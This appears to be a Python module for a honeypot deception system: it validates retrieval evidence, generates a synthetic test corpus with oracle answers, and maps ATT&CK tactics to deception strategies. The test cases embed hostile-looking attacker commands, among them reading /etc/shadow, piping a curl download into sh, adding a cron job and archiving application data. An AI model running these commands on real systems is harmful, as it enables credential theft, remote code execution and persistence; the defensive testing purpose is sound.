from __future__ import annotations

import copy
import hashlib
import json
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from typing import Any

GATE_STATES = (
    "VALID_EVIDENCE",
    "NO_EVIDENCE",
    "LOW_RELEVANCE",
    "INVALID_PROVENANCE",
    "UNRESOLVED_CONFLICT",
    "RETRIEVAL_FAILURE",
)
ALLOWED_STRATEGIES = (
    "baseline",
    "maximize_recon_surface",
    "fake_success_and_return_visits",
    "steer_to_honeytoken_credentials",
    "expose_decoy_internal_topology",
    "contain_in_fiction_and_instrument",
    "low_intensity_administration",
)
STRATA = (
    "valid_recon",
    "valid_credential_access",
    "valid_persistence",
    "valid_exploitation",
    "valid_data_access",
    "valid_benign_administration",
    "multi_document_support",
    "high_score_irrelevant",
    "low_score_relevant",
    "weak_or_missing_evidence",
    "retrieval_failure",
    "invalid_provenance",
    "duplicate_documents",
    "unresolved_conflict",
    "query_coverage_failure",
    "sanitization_failure",
)
_REQUIRED_TOP = ("session", "chrollo", "don_analysis", "retrieval")
_REQUIRED_SESSION = ("current_input",)
_REQUIRED_CHROLLO = ("skill_level", "confidence", "features_used", "feature_values")
_REQUIRED_DON = ("classification", "severity", "confidence", "tactics", "ttps_seen", "iocs")
_REQUIRED_RETRIEVAL = (
    "retrieval_status",
    "backend",
    "query",
    "sub_queries",
    "retrieved_count",
    "relevant_count",
    "relevant_doc_ids",
    "query_coverage",
    "documents",
    "trace_summary",
)


@dataclass(frozen=True)
class SyntheticCase:
    case_id: str
    stratum: str
    state: dict[str, Any]
    oracle: dict[str, Any]
    template_id: str

    def to_dict(self) -> dict[str, Any]:
        return {
            "case_id": self.case_id,
            "stratum": self.stratum,
            "template_id": self.template_id,
            "state": self.state,
            "oracle": self.oracle,
        }


def _fingerprint(doc: dict[str, Any]) -> str:
    material = {k: doc.get(k) for k in ("doc_id", "title", "content", "source")}
    return hashlib.sha256(json.dumps(material, sort_keys=True).encode()).hexdigest()


def _missing(obj: dict[str, Any], required: tuple[str, ...]) -> bool:
    return any(key not in obj for key in required)


class EvidenceQualityGate:
    version = "EVIDENCE_GATE_V1"

    def evaluate(self, bundle: dict[str, Any]) -> dict[str, Any]:
        if not isinstance(bundle, Mapping) or _missing(bundle, _REQUIRED_TOP):
            return self._result("RETRIEVAL_FAILURE", "malformed_bundle", [])
        session = bundle.get("session")
        chrollo = bundle.get("chrollo")
        don = bundle.get("don_analysis")
        retrieval = bundle.get("retrieval")
        if not all(isinstance(value, Mapping) for value in (session, chrollo, don, retrieval)):
            return self._result("RETRIEVAL_FAILURE", "malformed_bundle", [])
        if _missing(session, _REQUIRED_SESSION) or _missing(chrollo, _REQUIRED_CHROLLO):
            return self._result("RETRIEVAL_FAILURE", "missing_required_context", [])
        if _missing(don, _REQUIRED_DON) or _missing(retrieval, _REQUIRED_RETRIEVAL):
            return self._result("RETRIEVAL_FAILURE", "missing_required_field", [])

        retrieval_status = retrieval.get("retrieval_status")
        if retrieval_status == "FAILURE":
            return self._result("RETRIEVAL_FAILURE", "retrieval_failure", [])
        if retrieval_status == "DEGRADED":
            trace = retrieval.get("trace_summary")
            if not isinstance(trace, Mapping) or trace.get("usable_successful_retrieval") is not True:
                return self._result("RETRIEVAL_FAILURE", "retrieval_degraded", [])
        if retrieval_status != "SUCCESS":
            return self._result("RETRIEVAL_FAILURE", "unknown_retrieval_status", [])

        documents = retrieval.get("documents")
        relevant_ids = retrieval.get("relevant_doc_ids")
        if not isinstance(documents, Sequence) or isinstance(documents, (str, bytes)) or not isinstance(relevant_ids, Sequence) or isinstance(relevant_ids, (str, bytes)):
            return self._result("RETRIEVAL_FAILURE", "malformed_retrieval_fields", [])
        if not documents:
            return self._result("NO_EVIDENCE", "no_relevant_documents", [])
        if len({str(doc.get("doc_id")) for doc in documents if isinstance(doc, Mapping)}) != len(documents):
            return self._result("INVALID_PROVENANCE", "duplicate_doc_id", [])
        doc_ids: list[str] = []
        fingerprints: dict[str, str] = {}
        for doc in documents:
            if not isinstance(doc, Mapping) or any(key not in doc for key in ("doc_id", "title", "content", "source")):
                return self._result("INVALID_PROVENANCE", "malformed_document", [])
            doc_id = str(doc["doc_id"])
            doc_ids.append(doc_id)
            fp = _fingerprint(doc)
            if doc_id in fingerprints and fingerprints[doc_id] != fp:
                return self._result("INVALID_PROVENANCE", "inconsistent_duplicate_fingerprint", [])
            fingerprints[doc_id] = fp
            if doc.get("provenance_status") != "VALID":
                return self._result("INVALID_PROVENANCE", "invalid_or_unknown_provenance", [])
            if doc.get("sanitization_status") != "SANITIZED":
                return self._result("INVALID_PROVENANCE", "invalid_or_unknown_sanitization", [])
            if doc.get("conflict_status") == "UNRESOLVED":
                return self._result("UNRESOLVED_CONFLICT", "unresolved_document_conflict", [])
        evidence_filter = bundle.get("evidence_judge_filter")
        if evidence_filter is not None:
            if not isinstance(evidence_filter, Mapping) or evidence_filter.get("contract_version") != "EVIDENCE_JUDGE_FILTERING_V1":
                return self._result("RETRIEVAL_FAILURE", "malformed_evidence_judge_filter", [])
            filtered_ids = [str(doc_id) for doc_id in evidence_filter.get("filtered_relevant_doc_ids", [])]
            if filtered_ids != [str(doc_id) for doc_id in relevant_ids]:
                return self._result("RETRIEVAL_FAILURE", "inconsistent_evidence_judge_filter", [])
            filtered_sufficiency = evidence_filter.get("filtered_sufficiency")
            if filtered_sufficiency == "CONFLICTING":
                return self._result("UNRESOLVED_CONFLICT", "evidence_judge_filter_conflicting", [])
            if filtered_sufficiency != "SUFFICIENT" and filtered_ids:
                return self._result("LOW_RELEVANCE", f"evidence_judge_filter_{str(filtered_sufficiency).lower()}", [])
        if not relevant_ids or retrieval.get("relevant_count", 0) == 0:
            return self._result("NO_EVIDENCE", "no_relevant_documents", [])
        if any(str(doc_id) not in doc_ids for doc_id in relevant_ids):
            return self._result("INVALID_PROVENANCE", "unknown_relevant_doc_id", [])
        coverage = retrieval.get("query_coverage")
        if not isinstance(coverage, Mapping) or coverage.get("complete") is not True:
            return self._result("LOW_RELEVANCE", "incomplete_query_coverage", [])
        if int(retrieval.get("relevant_count", 0)) != len(relevant_ids):
            return self._result("LOW_RELEVANCE", "inconsistent_relevant_count", [])
        judge = bundle.get("evidence_judge")
        if judge is not None:
            if not isinstance(judge, Mapping) or judge.get("contract_version") != "EVIDENCE_JUDGE_V1":
                return self._result("RETRIEVAL_FAILURE", "malformed_evidence_judge", [])
            sufficiency = judge.get("sufficiency")
            if not isinstance(sufficiency, Mapping):
                return self._result("RETRIEVAL_FAILURE", "malformed_evidence_judge", [])
            label = sufficiency.get("label")
            if label == "CONFLICTING":
                return self._result("UNRESOLVED_CONFLICT", "evidence_judge_conflicting", [])
            if label != "SUFFICIENT":
                return self._result("LOW_RELEVANCE", f"evidence_judge_{str(label).lower()}", [])
        return self._result("VALID_EVIDENCE", "validated_bundle", sorted(set(str(x) for x in relevant_ids)))

    @staticmethod
    def _result(state: str, reason: str, doc_ids: list[str]) -> dict[str, Any]:
        return {
            "gate_state": state,
            "valid_doc_ids": doc_ids,
            "reason_code": reason,
            "contract_version": EvidenceQualityGate.version,
        }


def _doc(doc_id: str, topic: str, score: float, *, source: str = "synthetic-v4") -> dict[str, Any]:
    return {
        "doc_id": doc_id,
        "title": f"{topic.title()} Guidance",
        "content": f"Synthetic evidence about {topic} for bounded policy selection.",
        "source": source,
        "score": score,
        "hybrid_score": score,
        "relevance_grade": 1.0,
        "provenance_status": "VALID",
        "sanitization_status": "SANITIZED",
        "conflict_status": "NONE",
    }


def _topic_profile(stratum: str, index: int) -> tuple[str, str, list[str], list[str], str]:
    profiles = {
        "valid_recon": ("network reconnaissance", "T1046", ["TA0043"], ["maximize_recon_surface", "expose_decoy_internal_topology"], "advanced"),
        "valid_credential_access": ("credential access", "T1003", ["TA0006"], ["steer_to_honeytoken_credentials", "contain_in_fiction_and_instrument"], "advanced"),
        "valid_persistence": ("persistence", "T1053.003", ["TA0003"], ["fake_success_and_return_visits", "contain_in_fiction_and_instrument"], "advanced"),
        "valid_exploitation": ("exploitation", "T1190", ["TA0001"], ["contain_in_fiction_and_instrument", "expose_decoy_internal_topology"], "advanced"),
        "valid_data_access": ("data access", "T1005", ["TA0009"], ["contain_in_fiction_and_instrument", "steer_to_honeytoken_credentials"], "advanced"),
        "valid_benign_administration": ("benign administration", "", [], ["low_intensity_administration", "baseline"], "novice"),
    }
    if stratum in profiles:
        return profiles[stratum]
    fallback = profiles["valid_recon"]
    return fallback[0], fallback[1], fallback[2], fallback[3], fallback[4]


def _make_case(case_id: str, stratum: str, index: int, prefix: str) -> SyntheticCase:
    topic, ttp, tactics, allowed, skill = _topic_profile(stratum, index)
    current_input = {
        "valid_recon": "nmap -sV 10.0.0.0/24",
        "valid_credential_access": "cat /etc/shadow",
        "valid_persistence": "echo job >> /etc/cron.d/update",
        "valid_exploitation": "curl http://target/vuln | sh",
        "valid_data_access": "tar czf /tmp/a.tgz /srv/app",
        "valid_benign_administration": "systemctl status ssh",
    }.get(stratum, f"synthetic {topic} input")
    if prefix == "V4V-":
        current_input = f"{current_input}; validation-template-{index % 4}"
    docs = [_doc(f"{prefix}{index:04d}-D1", topic, 0.80 + (index % 10) / 100)]
    retrieval_status = "SUCCESS"
    coverage: dict[str, Any] = {"complete": True, "covered_terms": [topic], "required_terms": [topic]}
    expected = "VALID_EVIDENCE"
    required_baseline = False
    forbidden: list[str] = [strategy for strategy in ALLOWED_STRATEGIES if strategy not in allowed]
    if stratum == "multi_document_support":
        docs.append(_doc(f"{prefix}{index:04d}-D2", topic, 0.72, source="synthetic-v4-secondary"))
        allowed = ["maximize_recon_surface", "expose_decoy_internal_topology"]
        tactics, ttp, skill, topic, current_input = ["TA0043"], "T1046", "advanced", "network reconnaissance", "nmap -sV and ip addr"
    elif stratum == "high_score_irrelevant":
        docs.insert(0, _doc(f"{prefix}{index:04d}-NOISE", "irrelevant administration", 0.99))
        allowed = ["maximize_recon_surface", "expose_decoy_internal_topology"]
        tactics, ttp, skill, topic = ["TA0043"], "T1046", "advanced", "network reconnaissance"
    elif stratum == "low_score_relevant":
        docs[0]["score"] = 0.18
        docs[0]["hybrid_score"] = 0.18
        allowed = ["maximize_recon_surface", "expose_decoy_internal_topology"]
    elif stratum in {"weak_or_missing_evidence", "query_coverage_failure"}:
        expected = "NO_EVIDENCE" if index % 2 == 0 else "LOW_RELEVANCE"
        required_baseline = True
        allowed = ["baseline"]
        coverage = {"complete": False, "covered_terms": [], "required_terms": [topic]}
        docs = [] if expected == "NO_EVIDENCE" else docs
    elif stratum == "retrieval_failure":
        retrieval_status = "FAILURE"
        expected = "RETRIEVAL_FAILURE"
        required_baseline = True
        allowed = ["baseline"]
    elif stratum == "invalid_provenance":
        docs[0]["provenance_status"] = "INVALID"
        expected = "INVALID_PROVENANCE"
        required_baseline = True
        allowed = ["baseline"]
    elif stratum == "duplicate_documents":
        docs.append(copy.deepcopy(docs[0]))
        expected = "INVALID_PROVENANCE"
        required_baseline = True
        allowed = ["baseline"]
    elif stratum == "unresolved_conflict":
        docs[0]["conflict_status"] = "UNRESOLVED"
        expected = "UNRESOLVED_CONFLICT"
        required_baseline = True
        allowed = ["baseline"]
    elif stratum == "sanitization_failure":
        docs[0]["sanitization_status"] = "UNKNOWN"
        expected = "INVALID_PROVENANCE"
        required_baseline = True
        allowed = ["baseline"]
    elif stratum == "weak_or_missing_evidence":
        expected = "NO_EVIDENCE" if not docs else "LOW_RELEVANCE"
    if not docs and expected not in {"RETRIEVAL_FAILURE"}:
        relevant_ids: list[str] = []
    else:
        relevant_ids = [str(docs[0]["doc_id"])] if docs and expected in {"VALID_EVIDENCE", "LOW_RELEVANCE"} else []
    if expected == "VALID_EVIDENCE":
        forbidden = [strategy for strategy in ALLOWED_STRATEGIES if strategy not in allowed]
    else:
        forbidden = [strategy for strategy in ALLOWED_STRATEGIES if strategy != "baseline"]
    state = {
        "session": {"current_input": current_input},
        "chrollo": {
            "skill_level": skill,
            "confidence": round(0.70 + (index % 20) / 100, 2),
            "features_used": ["synthetic_feature"],
            "feature_values": {"synthetic_topic_index": index % 7, "command_count": 1 + index % 3},
        },
        "don_analysis": {
            "classification": "benign" if "benign" in stratum else "malicious",
            "severity": "info" if "benign" in stratum else "high",
            "confidence": 0.8,
            "tactics": [{"id": tactic, "name": tactic, "confidence": 0.8} for tactic in tactics],
            "ttps_seen": [ttp] if ttp else [],
            "iocs": [],
        },
        "retrieval": {
            "retrieval_status": retrieval_status,
            "backend": "synthetic-v4",
            "query": topic,
            "sub_queries": [topic],
            "retrieved_count": len(docs),
            "relevant_count": len(relevant_ids),
            "relevant_doc_ids": relevant_ids,
            "query_coverage": coverage,
            "documents": docs,
            "trace_summary": {"rounds": 0, "degraded": False, "retrieval_error_code": None},
        },
    }
    oracle = {
        "case_id": case_id,
        "evidence_gate_expected": expected,
        "allowed_strategies_if_valid": allowed,
        "supporting_evidence_ids": relevant_ids,
        "forbidden_strategies": forbidden,
        "required_baseline": required_baseline,
        "oracle_note": "SYNTHETIC_CONTRACT_ORACLE; NOT real-world ground truth.",
    }
    return SyntheticCase(case_id, stratum, state, oracle, f"{prefix.lower()}{stratum}_template_{index % 4}")


def generate_corpus(prefix: str, per_stratum: int, seed: int) -> list[SyntheticCase]:
    if prefix not in {"V4D-", "V4V-"}:
        raise ValueError("unsupported V4 corpus prefix")
    cases: list[SyntheticCase] = []
    index = 1
    for stratum in STRATA:
        for repeat in range(per_stratum):
            cases.append(_make_case(f"{prefix}{index:04d}", stratum, index + seed % 3 + repeat, prefix))
            index += 1
    return cases


def deterministic_policy(bundle: dict[str, Any], valid_doc_ids: list[str]) -> dict[str, Any]:
    don = bundle["don_analysis"]
    tactics = {str(item.get("id", "")) for item in don.get("tactics", []) if isinstance(item, dict)}
    ttps = {str(item) for item in don.get("ttps_seen", [])}
    strategy = "baseline"
    reason = "default_baseline"
    if "TA0006" in tactics or any(ttp.startswith(("T1003", "T1552")) for ttp in ttps):
        strategy, reason = "steer_to_honeytoken_credentials", "credential_access"
    elif "TA0003" in tactics or any(ttp.startswith("T1053") for ttp in ttps):
        strategy, reason = "fake_success_and_return_visits", "persistence"
    elif "TA0043" in tactics or any(ttp in {"T1046", "T1016", "T1049"} for ttp in ttps):
        strategy, reason = "maximize_recon_surface", "reconnaissance"
    elif "TA0001" in tactics or any(ttp == "T1190" for ttp in ttps):
        strategy, reason = "contain_in_fiction_and_instrument", "exploitation"
    elif "TA0009" in tactics or any(ttp == "T1005" for ttp in ttps):
        strategy, reason = "contain_in_fiction_and_instrument", "data_access"
    elif don.get("classification") == "benign" or don.get("severity") == "info":
        strategy, reason = "low_intensity_administration", "benign_administration"
    return {
        "schema": "ragin.decision_fusion_v4.policy_decision.v1",
        "policy_engine_id": "deterministic_v1",
        "selected_response_strategy": strategy,
        "supporting_evidence_refs": list(valid_doc_ids[:1]),
        "policy_reason_code": reason,
        "input_digest": hashlib.sha256(json.dumps(bundle, sort_keys=True).encode()).hexdigest(),
    }


def extract_features(bundle: dict[str, Any], valid_doc_ids: list[str]) -> dict[str, Any]:
    chrollo = bundle["chrollo"]
    don = bundle["don_analysis"]
    retrieval = bundle["retrieval"]
    features: dict[str, Any] = {
        "chrollo_skill": chrollo.get("skill_level", "unknown"),
        "chrollo_confidence": float(chrollo.get("confidence", 0.0)),
        "don_classification": don.get("classification", "unknown"),
        "don_severity": don.get("severity", "unknown"),
        "vetted_document_count": len(valid_doc_ids),
        "retrieved_count": int(retrieval.get("retrieved_count", 0)),
        "relevant_count": int(retrieval.get("relevant_count", 0)),
        "coverage_complete": bool(retrieval.get("query_coverage", {}).get("complete", False)),
        "ioc_count": len(don.get("iocs", [])),
    }
    for item in don.get("tactics", []):
        if isinstance(item, dict):
            features[f"tactic_{item.get('id', 'unknown')}"] = 1
    for ttp in don.get("ttps_seen", []):
        features[f"ttp_{ttp}"] = 1
    return features


def run_policy(engine: Any, bundle: dict[str, Any], gate_result: dict[str, Any]) -> dict[str, Any]:
    if gate_result.get("gate_state") != "VALID_EVIDENCE":
        return {
            "schema": "ragin.decision_fusion_v4.policy_decision.v1",
            "policy_engine_id": "caller_fallback",
            "selected_response_strategy": "baseline",
            "supporting_evidence_refs": [],
            "policy_reason_code": "gate_not_valid",
            "input_digest": hashlib.sha256(json.dumps(bundle, sort_keys=True).encode()).hexdigest(),
        }
    return engine(bundle, gate_result["valid_doc_ids"])
